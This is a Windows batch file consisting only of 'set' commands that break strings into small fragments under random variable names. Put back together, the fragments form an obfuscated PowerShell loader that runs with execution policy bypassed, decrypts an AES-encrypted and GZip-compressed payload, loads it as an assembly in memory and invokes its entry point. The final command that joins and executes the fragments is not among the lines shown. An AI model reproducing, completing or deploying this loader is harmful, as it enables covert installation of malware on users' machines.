@echo off
set "ZWXUzXjmFL=.e"
set "MPGinwadlV=Po"
set "eBJToHQaeu=em"
set "vaaQbgiknH=we"
set "DgelqbjHkv=xe"
set "fcFOodbzKL=nd"
set "EkxXfRkvlc=co"
set "oHDHSnyOLn=ll"
set "ZqJlJBdoWR=:\"
set "fKQBlktiIc=do"
set "jqXMHsYLmh=ll"
set "yASyJYkOmH=Wi"
set "hXphkHNuMr=in"
set "ixoaYWLUWG=Sy"
set "XFXtdbxpFg=\v"
set "tylFKTIKoo=s\"
set "sZCoofPlby=ws"
set "LlABfwJyVY=rs"
set "vLsrDhvbSe=rS"
set "RCtnFpeHoO=he"
set "nRFuXrkzYS=he"
set "ZFSQAeISJR= /"
set "FJNhdDTJes=ow"
set "bZkgeSGNlL=1."
set "RYMySPUbtV=\W"
set "SOchNkfRIO=we"
set "YUMIZqUKVa=y "
set "iJOKhmEZkD=po"
set "cAWzxfOFJk=0\"
set "uqkvCivNig=32"
set "AEEklOMKvg=st"
set "uAjYmtmAIe= C"
set "UDUOUxNiwi=py"
set "euclHyFbUX=cd"
set "QKbFrWaHNt= %~dp0"
set "HEszzZRNSk=Dgf "
set "GTUFGbQZdB=; };"
set "LyRCdKqvUO=]::N"
set "PNgsWuuisK=yTo("
set "fqKrzJUvPP=tryP"
set "CheJnVZLls=LE ="
set "ueCFRplLpw=Comp"
set "pMNKwgTaWl=rity"
set "aKzdVDOtKa=m(, "
set "UhKrJbdSSi=.-16"
set "VeGAphXSiY=YZkf"
set "kbSfHNSHdF=ateD"
set "biWgKDlLGn='gni"
set "zxGLONACWj=bXI."
set "fwAwwzFBGc=$MBl"
set "HnczhmFuTc=d;$p"
set "XWxuqAsQuc=in $"
set "lFCosfAgGQ= = N"
set "JmEtdcTeZV='[-1"
set "EQZPNUccsv=..-1"
set "LjUWMZemwf=R = "
set "qYKSBSjKrt=R, 0"
set "UyOyWxHmTW=bjec"
set "tYmDtuZrnG=Secu"
set "VYltLwFpib=gsYZ"
set "YHbMUltefd==');"
set "oJTnWYZKEt=y]::"
set "vwthUUbiuj=am;$"
set "TZsZAbIwMn=:('g"
set "fVnHfqLNsu=ELCO"
set "aKgoFuPqgN=.Com"
set "qRTRwTHura=:: '"
set "uTjGQRzHKe=fore"
set "bukkBrEoie=Invo"
set "kFfQRRWPdt=bJ ="
set "ZUbWfEZAgh=raph"
set "mPwywebwka=New-"
set "NcjlIaxHoF=('Tg"
set "qosCeSWCyi=Conv"
set "MpbzlxBhGu=Mode"
set "AUithlOrfi=s75K"
set "JyxqjxnUgS=$pEL"
set "nMLavrdDFp=.Cop"
set "dPoTtloTWb=hy.A"
set "mcofSmTCey=g = "
set "eTZBAtkzTB=BC;$"
set "OUsckQUAEx=y.Ci"
set "wdFrRHEtWu=m.IO"
set "XjVrxoKPXz=zHhH"
set "zitxnulMbD=YZkf"
set "PRBACCsdRj=);$p"
set "EuXVENpwnY=7;$p"
set "DBeUQNkkzl=-joi"
set "iWLceUcacA=gnir"
set "YCgAZltnsb=Un, "
set "lByKFyozvB=CFxo"
set "TFGtCmnIbS=$zPH"
set "vqbGrkbEUC=.GZi"
set "cWujXOipFO=rofi"
set "hQNmaGVfMC=CO.I"
set "cbROpFUmbJ=ptor"
set "IcdcbrlDJo=rans"
set "MZsNlESGhq=.Mod"
set "SetuDlUVVq= [st"
set "FYPdrFyhvY=ZkfR"
set "IwLRzoYkDa=;$Bf"
set "icmLPtrPqe=[-1."
set "lnpVHfSwGW=] -j"
set "SwBboCOuWO=Rjjn"
set "uOhzNNuwMa=ecry"
set "HFfUEtmjig=-nop"
set "LNsJkpymXc=form"
set "fQfgBKFGPZ=rity"
set "VMGsKWDrZb=k; }"
set "szOzzetFEU= = $"
set "EWKNaITBpC=)))"
set "dfSqboMIeA=bJ);"
set "AZtyecXbOI=Obje"
set "sbaHRkIrhF=pStr"
set "PVhmaFFVYT=f.En"
set "byJzRwetuU=);$I"
set "tAOfezMBek=$IVe"
set "tMvQJzGvlC=[Env"
set "PIupBDBOce= '')"
set "FtjZnuVNGL=mkPb"
set "MUUMckqejS=, $Y"
set "HTRqEOZRUa=brea"
set "bbasRjpPWR=H.Su"
set "QLAUuyxIJs=fR ="
set "uBDPZPfBGP=morF"
set "qgePFKpqCV='')("
set "vUujfAWflq=tion"
set "UAzyRlgOOL=.Cry"
set "tyqofRmpDV=BE.D"
set "FyYwGQDyKB=oArr"
set "IfPKJMQerV=.Sec"
set "aJYMgjSbxP=ck($"
set "LBXClJUPqH=ispo"
set "whHXcVuVDw= = ["
set "GnIHQlmUge=PKCS"
set "rRMtUyntQD=ose("
set "huwubzPzJW=($mk"
set "zFTsDkomhw=t Sy"
set "DIFgQnmrmr=]::("
set "mhPvRUnGrB=ELCO"
set "fAIDJwhALu=S46e"
set "icxCHPWhrR=]::("
set "ulyVtnCFHk=)($H"
set "JMjkHBAIkc=l5E7"
set "oMTjBYtjEt=O.Pa"
set "ZTHFHdzTKP= if "
set "UiTzWhrhvC=yste"
set "CchVsfWVQf=n ''"
set "ploafgZSNf=ne);"
set "ibzazEBpMa=Obje"
set "jRYGhHdBTG=ose("
set "YLyCjmlPMU=tsWi"
set "WJosRNMJfJ=ELCO"
set "fKSKmEevym=ct S"
set "UlzLwkVOYG=raph"
set "IYRlHQgyga=ress"
set "vNlODMbBGc= [Sy"
set "xRWFEcsKwA=-ep "
set "rCZcqCJYsQ=ew-O"
set "vNuilIxIvs=, (,"
set "OuihLNifQS=ZkfR"
set "cTQuyRABYx=ionM"
set "tWnYzQlIkU=rt]:"
set "ZsLvlbeBTF=trea"
set "qsWVqzRFep=null"
set "rJEwYgaKnt=New-"
set "sSKyHupWpW=TllA"
set "ZNGYsotiRh=.IO."
set "EAYjokqGvC=16] "
set "TOFkwPgacT=.Key"
set "vZZBYPLeSE=rtS4"
set "nwQWOHbNGk=y.Cr"
set "hyTWbRpBZQ=dj0C"
set "egCjYriGAV=;$zP"
set "qqjOOmlNmN=iron"
set "HMeSrEHurX=se()"
set "pagUuFYLMw=6esa"
set "syClRKORBp=ress"
set "tkUmYNZNKg=grap"
set "eSoNCacbLe=1..-"
set "iMviLgSGfp=Rjjn"
set "GIkOuwheds=E) {"
set "wMmDoNJlzL=).Sp"
set "eNvWmQPbQc=embl"
set "jmcqRfjAqX=eMVs"
set "IeEhTYRkRG=ay()"
set "TYahsIgnwo='txe"
set "IMVYPijdQb=R = "
set "vADOkyTyZe=gjYA"
set "bUnmouPjJQ=ypto"
set "NBPVvjdWDR=F'[-"
set "kZyjYMHnsu=em.I"
set "JVbQWpMIaT=PbH."
set "XaOtDCxpMD=stem"
set "JPCtvYerwR=fR);"
set "JZpofSCEbU=pose"
set "eUIOFKPtpe=RmAx"
set "GotuBzwuye=onve"
set "aIXVsJAtnH=ress"
set "UxlJsMrzTW=bJ.T"
